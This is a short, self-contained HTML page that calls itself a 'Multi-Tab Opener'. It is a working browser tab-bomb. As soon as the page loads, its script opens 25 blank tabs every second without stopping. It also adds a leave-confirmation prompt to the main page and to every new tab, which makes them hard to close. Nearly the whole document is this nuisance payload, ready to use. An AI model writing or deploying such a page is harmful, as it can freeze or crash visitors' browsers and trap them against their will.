<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Multi-Tab Opener</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        .tab-count {
            font-size: 48px;
            color: #667eea;
            font-weight: bold;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Opening Tabs...</h1>
        <div class="tab-count" id="tabCounter">0</div>
        <p>25 new blank tabs open every second!</p>
    </div>

    <script>
        let tabCount = 0;

        // Add leave confirmation to main page
        window.onbeforeunload = function (e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        };

        function openTwentyFiveTabs() {
            for (let i = 0; i < 25; i++) {
                let newTab = window.open('', '_blank');

                if (newTab) {
                    newTab.document.write(`
                        <!DOCTYPE html>
                        <html>
                        <head>
                            <title>New Tab</title>
                        </head>
                        <body>
                            <h2>This tab requires confirmation before leaving.</h2>
                            <script>
                                window.onbeforeunload = function(e) {
                                    e.preventDefault();
                                    e.returnValue = '';
                                    return '';
                                };
                            <\/script>
                        </body>
                        </html>
                    `);
                    newTab.document.close();
                }

                tabCount++;
            }

            document.getElementById('tabCounter').textContent = tabCount;
        }

        // Start immediately
        openTwentyFiveTabs();

        // Repeat every second
        setInterval(openTwentyFiveTabs, 1000);
    </script>
</body>
</html>
